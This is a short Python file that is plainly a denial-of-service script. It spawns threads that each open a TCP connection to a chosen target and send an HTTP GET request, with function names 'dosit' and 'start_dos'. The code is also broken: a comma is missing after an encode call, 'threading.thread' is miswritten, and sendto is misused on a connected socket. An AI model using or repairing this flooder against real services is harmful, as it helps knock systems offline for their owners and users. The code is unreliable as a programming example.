import socket
import threading


def dosit(target,port):
    # pass    
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.connect((target,port))
    ss.sendto(("GET /" + target + " HTTP/1.1\r\n").encode() (target, port))
    ss.sendto(("Host: " + "192.168.1.1" + "\r\n\r\n").encode(), (target, port))
    ss.close()


def start_dos(threads,target,port):
    for i in range(0,threads):
        th = threading.thread(target=dosit,args=(target,port,))
        th.start()